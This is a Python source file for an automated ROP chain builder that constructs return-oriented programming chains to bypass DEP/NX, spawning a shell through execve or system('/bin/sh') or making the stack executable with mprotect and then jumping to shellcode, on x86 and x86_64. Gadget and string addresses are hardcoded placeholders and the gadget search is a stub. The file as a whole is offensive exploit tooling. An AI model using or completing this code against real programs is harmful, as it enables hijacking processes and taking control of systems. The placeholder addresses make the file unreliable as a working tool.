"""
ROP Chain Builder
Automated Return-Oriented Programming chain construction
"""

import logging
from typing import Dict, List, Any, Optional, Tuple
import struct

logger = logging.getLogger(__name__)


class ROPChainBuilder:
    """
    Builds ROP chains for bypassing DEP/NX
    """
    
    def __init__(self, config: Dict[str, Any]):
        self.config = config
        self.architecture = config.get('architecture', 'x86_64')
        self.binary_path = config.get('binary', '')
        self.gadgets = []
        
    async def build_chain(self, target_info: Dict[str, Any]) -> bytes:
        """
        Build ROP chain for target
        
        Args:
            target_info: Target binary information
            
        Returns:
            ROP chain as bytes
        """
        logger.info("Building ROP chain")
        
        # Find gadgets in binary
        self.gadgets = await self._find_gadgets()
        
        # Determine what to call
        goal = target_info.get('goal', 'execve')
        
        if goal == 'execve' or goal == 'shell':
            chain = await self._build_execve_chain()
        elif goal == 'mprotect':
            chain = await self._build_mprotect_chain(target_info)
        elif goal == 'system':
            chain = await self._build_system_chain()
        else:
            logger.warning(f"Unknown ROP goal: {goal}")
            chain = b''
        
        logger.info(f"ROP chain built: {len(chain)} bytes")
        
        return chain
    
    async def _find_gadgets(self) -> List[Dict[str, Any]]:
        """Find ROP gadgets in binary"""
        logger.info("Searching for ROP gadgets")
        
        gadgets = []
        
        try:
            # Use ROPgadget, ropper, or similar tool
            # This would actually parse binary and find gadgets
            
            # Placeholder gadgets for x86_64
            if self.architecture == 'x86_64':
                gadgets = [
                    {'address': 0x400686, 'gadget': 'pop rdi; ret', 'type': 'pop_rdi'},
                    {'address': 0x400684, 'gadget': 'pop rsi; pop r15; ret', 'type': 'pop_rsi'},
                    {'address': 0x400680, 'gadget': 'pop rdx; ret', 'type': 'pop_rdx'},
                    {'address': 0x400683, 'gadget': 'pop rax; ret', 'type': 'pop_rax'},
                    {'address': 0x400689, 'gadget': 'syscall; ret', 'type': 'syscall'},
                    {'address': 0x400690, 'gadget': 'ret', 'type': 'ret'},
                ]
            elif self.architecture == 'x86':
                gadgets = [
                    {'address': 0x08048386, 'gadget': 'pop eax; ret', 'type': 'pop_eax'},
                    {'address': 0x08048389, 'gadget': 'pop ebx; ret', 'type': 'pop_ebx'},
                    {'address': 0x0804838c, 'gadget': 'pop ecx; ret', 'type': 'pop_ecx'},
                    {'address': 0x0804838f, 'gadget': 'pop edx; ret', 'type': 'pop_edx'},
                    {'address': 0x08048392, 'gadget': 'int 0x80; ret', 'type': 'syscall'},
                ]
            
            # Would actually use:
            # import subprocess
            # result = subprocess.run(['ROPgadget', '--binary', self.binary_path], 
            #                        capture_output=True, text=True)
            # Parse output to extract gadgets
            
        except Exception as e:
            logger.warning(f"Gadget search error: {e}")
        
        logger.info(f"Found {len(gadgets)} gadgets")
        
        return gadgets
    
    def _find_gadget(self, gadget_type: str) -> Optional[int]:
        """Find specific gadget by type"""
        for gadget in self.gadgets:
            if gadget['type'] == gadget_type:
                return gadget['address']
        return None
    
    async def _build_execve_chain(self) -> bytes:
        """Build ROP chain for execve('/bin/sh', NULL, NULL)"""
        chain = b''
        
        if self.architecture == 'x86_64':
            # execve syscall number (59)
            # rdi = pointer to "/bin/sh"
            # rsi = NULL
            # rdx = NULL
            # rax = 59
            
            # Assume /bin/sh string is in binary at known address
            binsh_addr = 0x601050  # Placeholder - would find actual address
            
            # pop rdi; ret - load address of "/bin/sh" into rdi
            pop_rdi = self._find_gadget('pop_rdi')
            if pop_rdi:
                chain += struct.pack('<Q', pop_rdi)
                chain += struct.pack('<Q', binsh_addr)
            
            # pop rsi; pop r15; ret - load NULL into rsi
            pop_rsi = self._find_gadget('pop_rsi')
            if pop_rsi:
                chain += struct.pack('<Q', pop_rsi)
                chain += struct.pack('<Q', 0)  # rsi = NULL
                chain += struct.pack('<Q', 0)  # r15 = dummy
            
            # pop rdx; ret - load NULL into rdx
            pop_rdx = self._find_gadget('pop_rdx')
            if pop_rdx:
                chain += struct.pack('<Q', pop_rdx)
                chain += struct.pack('<Q', 0)  # rdx = NULL
            
            # pop rax; ret - load syscall number
            pop_rax = self._find_gadget('pop_rax')
            if pop_rax:
                chain += struct.pack('<Q', pop_rax)
                chain += struct.pack('<Q', 59)  # execve syscall
            
            # syscall; ret
            syscall = self._find_gadget('syscall')
            if syscall:
                chain += struct.pack('<Q', syscall)
                
        elif self.architecture == 'x86':
            # 32-bit execve
            # eax = 11 (execve)
            # ebx = pointer to "/bin/sh"
            # ecx = NULL
            # edx = NULL
            
            binsh_addr = 0x0804a000
            
            pop_eax = self._find_gadget('pop_eax')
            if pop_eax:
                chain += struct.pack('<I', pop_eax)
                chain += struct.pack('<I', 11)  # execve
            
            pop_ebx = self._find_gadget('pop_ebx')
            if pop_ebx:
                chain += struct.pack('<I', pop_ebx)
                chain += struct.pack('<I', binsh_addr)
            
            pop_ecx = self._find_gadget('pop_ecx')
            if pop_ecx:
                chain += struct.pack('<I', pop_ecx)
                chain += struct.pack('<I', 0)
            
            pop_edx = self._find_gadget('pop_edx')
            if pop_edx:
                chain += struct.pack('<I', pop_edx)
                chain += struct.pack('<I', 0)
            
            syscall = self._find_gadget('syscall')
            if syscall:
                chain += struct.pack('<I', syscall)
        
        return chain
    
    async def _build_mprotect_chain(self, target_info: Dict[str, Any]) -> bytes:
        """
        Build ROP chain to call mprotect and make stack executable
        Then jump to shellcode on stack
        """
        chain = b''
        
        if self.architecture == 'x86_64':
            # mprotect(addr, len, PROT_READ|PROT_WRITE|PROT_EXEC)
            # rdi = address (page aligned)
            # rsi = length
            # rdx = protection (7 = RWX)
            # rax = 10 (mprotect syscall)
            
            stack_addr = target_info.get('stack_address', 0x7ffffffde000)
            stack_size = target_info.get('stack_size', 0x21000)
            
            # pop rdi; ret
            pop_rdi = self._find_gadget('pop_rdi')
            if pop_rdi:
                chain += struct.pack('<Q', pop_rdi)
                chain += struct.pack('<Q', stack_addr & 0xfffffffffffff000)  # Page aligned
            
            # pop rsi; pop r15; ret
            pop_rsi = self._find_gadget('pop_rsi')
            if pop_rsi:
                chain += struct.pack('<Q', pop_rsi)
                chain += struct.pack('<Q', stack_size)
                chain += struct.pack('<Q', 0)  # r15 dummy
            
            # pop rdx; ret
            pop_rdx = self._find_gadget('pop_rdx')
            if pop_rdx:
                chain += struct.pack('<Q', pop_rdx)
                chain += struct.pack('<Q', 7)  # PROT_READ|PROT_WRITE|PROT_EXEC
            
            # pop rax; ret
            pop_rax = self._find_gadget('pop_rax')
            if pop_rax:
                chain += struct.pack('<Q', pop_rax)
                chain += struct.pack('<Q', 10)  # mprotect
            
            # syscall
            syscall = self._find_gadget('syscall')
            if syscall:
                chain += struct.pack('<Q', syscall)
            
            # After mprotect, jump to shellcode location
            shellcode_addr = target_info.get('shellcode_address', stack_addr + 0x100)
            chain += struct.pack('<Q', shellcode_addr)
        
        return chain
    
    async def _build_system_chain(self) -> bytes:
        """Build ROP chain to call system('/bin/sh')"""
        chain = b''
        
        # Find system() in PLT/GOT
        system_addr = 0x400450  # Placeholder - would find actual address
        binsh_addr = 0x601050
        
        if self.architecture == 'x86_64':
            # system() takes one argument in rdi
            pop_rdi = self._find_gadget('pop_rdi')
            if pop_rdi:
                chain += struct.pack('<Q', pop_rdi)
                chain += struct.pack('<Q', binsh_addr)
            
            # Call system
            chain += struct.pack('<Q', system_addr)
            
        elif self.architecture == 'x86':
            # 32-bit: argument on stack
            chain += struct.pack('<I', system_addr)
            chain += struct.pack('<I', 0x41414141)  # Return address (dummy)
            chain += struct.pack('<I', binsh_addr)  # Argument
        
        return chain
    
    def analyze_rop_chain(self, chain: bytes) -> Dict[str, Any]:
        """
        Analyze generated ROP chain
        
        Args:
            chain: ROP chain bytes
            
        Returns:
            Analysis results
        """
        analysis = {
            'length': len(chain),
            'gadgets_used': [],
            'bad_chars': [],
            'reliability': 'unknown'
        }
        
        # Check for bad characters (null bytes, etc.)
        if b'\x00' in chain:
            analysis['bad_chars'].append('null_byte')
            analysis['reliability'] = 'low'
        
        if b'\x0a' in chain:
            analysis['bad_chars'].append('newline')
        
        if b'\x0d' in chain:
            analysis['bad_chars'].append('carriage_return')
        
        if not analysis['bad_chars']:
            analysis['reliability'] = 'high'
        
        return analysis
    
    async def optimize_chain(self, chain: bytes) -> bytes:
        """
        Optimize ROP chain to avoid bad characters
        
        Args:
            chain: Original chain
            
        Returns:
            Optimized chain
        """
        # Find alternative gadgets that avoid bad chars
        # Could use ROP chain encoding techniques
        
        return chain
